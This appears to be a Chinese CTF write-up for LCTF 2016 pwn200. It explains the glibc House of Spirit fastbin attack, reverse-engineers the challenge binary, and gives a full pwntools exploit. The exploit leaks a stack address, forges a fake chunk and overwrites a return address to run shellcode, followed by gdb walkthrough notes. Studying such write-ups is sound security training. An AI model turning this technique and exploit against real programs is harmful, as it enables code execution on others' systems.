# lctf-2016-pwn200
https://blog.csdn.net/SWEET0SWAT/article/details/98852678

## House of Spirit 原理

House of Spirit是Fastbin Attack的其中一种攻击手段。这种攻击手段是变量覆盖和堆管理机制的组合利用，其核心操作是在目标位置处伪造 fastbin chunk，利用变量覆盖的手段覆盖堆指针，使其指向fastbin fake chunk，而后将其释放，再申请刚释放的fake chunk，就有可能改写原先不可控的区域。

因为在调用free()函数释放fastbin的时候会进行一些检查，所以需要在构造fake chunk的时候留意一下细节

- 首先mmap标志位不能为1，否则会直接调用munmap_chunk函数去释放堆块。

```c
 void
 public_fREe(Void_t* mem)
 {
   mstate ar_ptr;
   mchunkptr p;                          /* chunk corresponding to mem */
  
   [...]
  
   p = mem2chunk(mem);
 
#if HAVE_MMAP
  if (chunk_is_mmapped(p))         /*release mmapped memory. 若mmap标志为1，则不走_int_free()函数进行释放*/
  {
    munmap_chunk(p);
    return;
  }
#endif
 
  ar_ptr = arena_for_chunk(p);
 
  [...]
 
  _int_free(ar_ptr, mem);
```

- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
- fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ（x64的系统下不能小于16），同时也不能大于av->system_mem（x64的系统下system_mem为128kb）。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

```c
  void
  _int_free(mstate av, Void_t* mem)
  {
    mchunkptr       p;           /* chunk corresponding to mem */
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr*    fb;          /* associated fastbin */
   
    [...]
   
   p = mem2chunk(mem);
   size = chunksize(p);
  
   [...]
  
   /*
     If eligible, place chunk on a fastbin so it can be found
     and used quickly in malloc.
   */
  
   if ((unsigned long)(size) <= (unsigned long)(av->max_fast)   /*其次，size的大小不能超过fastbin的最大值*/
  
 #if TRIM_FASTBINS
       /*
        If TRIM_FASTBINS set, don't place chunks
        bordering top into fastbins
       */
       && (chunk_at_offset(p, size) != av->top)
 #endif
       ) {
  
     if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize (chunk_at_offset (p, size))
                          >= av->system_mem, 0))                        /*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/
       {
        errstr = "free(): invalid next size (fast)";
        goto errout;
       }
  
     [...]
     fb = &(av->fastbins[fastbin_index(size)]);
     [...]
     p->fd = *fb;
   }
```

## l-ctf 2016 pwn200 程序分析

首先逆向程序，熟悉程序的功能和函数调用流程：

一开始找到main函数：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_40079D(a1, a2, a3);
  sub_400A8E();
  return 0LL;
}
```

sub_40079D函数是用来设置缓冲情况，可以跳过，追入sub_400A8E查看

```c
__int64 sub_400A8E()
{
  signed __int64 i; // [rsp+10h] [rbp-40h]
  char v2[48]; // [rsp+20h] [rbp-30h]

  puts("who are u?");
  for ( i = 0LL; i <= 47; ++i )
  {
    read(0, &v2[i], 1uLL);
    if ( v2[i] == 10 )
    {
      v2[i] = 0;
      break;
    }
  }
  printf("%s, welcome to xdctf~\n", v2);
  puts("give me your id ~~?");
  sub_4007DF();
  return sub_400A29();
}
```

在这个函数中可以发现在往v2数组中存放字符串的时候没有控制好循环次数，导致可以覆盖数组最后的\x00而printf函数输出v2数组内容的时候可以泄露rbp栈地址（main函数的rbp，后面调试信息会详细描述）。

以此查看sub_4007DF和sub_400A29

```c
int sub_4007DF()
{
  int result; // eax
  char nptr[8]; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  v2 = 0;
  for ( i = 0; i <= 3; ++i )
  {
    read(0, &nptr[i], 1uLL);
    if ( nptr[i] == 10 )
    {
      nptr[i] = 0;
      break;
    }
    if ( nptr[i] > 57 || nptr[i] <= 47 )
    {
      printf("0x%x ", (unsigned int)nptr[i]);
      return 0;
    }
  }
  v2 = atoi(nptr);
  if ( v2 >= 0 )
    result = atoi(nptr);
  else
    result = 0;
  return result;
}
```

这个只是用来输入数字并转化成int类型数据。

```c
__int64 sub_400A29()
{
  char *v0; // rdi
  char buf; // [rsp+0h] [rbp-40h]
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL);
  puts("give me money~");
  read(0, &buf, 0x40uLL);
  v0 = dest;
  strcpy(dest, &buf);
  ptr = dest;
  return sub_4009C4(v0, &buf);
}
```

这里申请了0x40大小的chunk，并将申请到的chunk地址赋给dest

这里不妨也回想一下dest所指的地址是申请到的chunk的哪个部位（这点后面构造chunk会用到）：

fig

之后用read函数读入"money"保存到buf中。但这里值得注意的是：buff的大小是(rsp+38h)-(rsp+0h)，而read可以读0x40个数据，这里会造成overflow，而被盖掉的是dest，也就是保存malloc出来的chunk地址

fig

紧接着用strcpy函数将buf中的数值复制到chunk中，但是strcpy函数有个特点就是遇到\x00就会终止复制，所以这个步骤实际上是可以被绕过的。再接着查看sub_4009C4

```c
int sub_4009C4()
{
  int v0; // eax

  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009AF();
      v0 = sub_4007DF();
      if ( v0 != 2 )
        break;
      sub_40096D();
    }
    if ( v0 == 3 )
      break;
    if ( v0 == 1 )
      sub_4008B7();
    else
      puts("invalid choice");
  }
  return puts("good bye~");
}
```

这个函数功能就是打印菜单信息（sub_4009AF），然后选择功能点。

根据功能点整理剩下的函数：

> sub_4008B7 --> check in ( malloc )
> sub_40096D --> check out ( free )
> sub_4007DF --> input chose ( 这个前面其实已经分析过了，就不再重复 )

大概浏览一下check in和check out函数就行了

```c
int sub_4008B7() /* check in */
{
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  if ( ptr )
    return puts("already check in");
  puts("how long?");
  LODWORD(nbytes) = sub_4007DF();
  if ( (signed int)nbytes <= 0 || (signed int)nbytes > 128 )
    return puts("invalid length");
  ptr = malloc((signed int)nbytes);
  printf("give me more money : ");
  printf("\n%d\n", (unsigned int)nbytes);
  read(0, ptr, (unsigned int)nbytes);
  return puts("in~");
}
```

```c
void sub_40096D() /* check out */
{
  if ( ptr )
  {
    puts("out~");
    free(ptr);
    ptr = 0LL;
  }
  else
  {
    puts("havn't check in");
  }
}
```

熟悉完程序就可以来调试了，本次学习用的exp是借鉴其他大佬写的

## l-ctf 2016 pwn200 调试经过

EXP

```python
from pwn import *

context.log_level = 'debug'
p = process('./pwn200')

shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')

gdb.attach(p,'b *0x400ac7')
# part one
payload  = ''
payload += shellcode.ljust(48)

p.recvuntil('who are u?\n')
p.send(payload)
p.recvuntil(payload)

rbp_addr = u64(p.recvn(6).ljust(8, '\x00'))

shellcode_addr = rbp_addr - 0x50 # 20H + 30H
print "shellcode_addr: ", hex(shellcode_addr)
fake_addr = rbp_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address


p.recvuntil('give me your id ~~?\n')
# raw_input('#')
p.sendline('32') # id
p.recvuntil('give me money~\n')
# raw_input('#')

#part two
#32bytes padding + prev_size + size + padding + fake_addr
data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy
data = data.ljust(56, '\x00') + p64(fake_addr)
print data

p.send(data)

p.recvuntil('choice : ')
p.sendline('2')     # free(fake_addr)

p.recvuntil('choice : ')
p.sendline('1')     #malloc(fake_addr) #fake_addr

p.recvuntil('long?')
p.sendline('48')    # 48 + 16 = 64 = 0x40
p.recvline('48')    # ptr = malloc(48)

data = 'a' * 0x18 + p64(shellcode_addr) # write to target_addr
data = data.ljust(48, '\x00')

p.send(data)

p.recvuntil('choice')
p.sendline('3')

p.interactive()

```

在0x400AFE，0x4008B5，0x400A36三个地方下断点，方便调试。

运行EXP并用GDB挂载，运行程序到printf函数处，得到泄漏的rbp信息

fig

用gdb查看此时的堆栈情况：

fig

那么此时就知道shellcode的存放位置距离泄露的rbp的位置的偏移，就能算出shellcode的地址为rbp - 0x50。（计算该位置是为了方便最后jump到此处执行shellcode。）

fig

接着运行程序，会让用户输入一个id值。payload给出的是输入32。

这里实际上输入32是为了伪造next chunk size，目的是让后面的fake chunk能够顺利free掉。

fig

之后malloc一个chunk，但是因为没有往里面写入数据所以我们没有必要关注。现在关注的是buf和dest两个变量在内存中的排布问题。

经过逐步调试，可以得知排布情况：

fig

这里存在的问题在上面程序分析的时候有提到，存在数组溢出问题，所以这里往buf中传送0x40的数据后，就能把buf指针覆盖。

fig

再运行到free后，观察main_arena的情况：

```bash
$2 = {0x0, 0x0, 0x7ffecc490d70, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```

这里chunk已经被挂到了fastbin上，但是值得注意的是，挂上去的地址是0x7ffecc490d70 而不是malloc出来的chunk。这是因为free掉了dest所指的地址。

这时候如果再次malloc，那么得到的地址就是0x7ffecc490d70，然后原先不可控的返回地址（0x7ffecc490d98处）就可以被改写了任意的数据（也就是写成shellcode的地址）。

fig

当退出循环的时候，程序执行到ret指令（如下图的0x400a8d）,RIP指针就会被改写成shellcode地址。

fig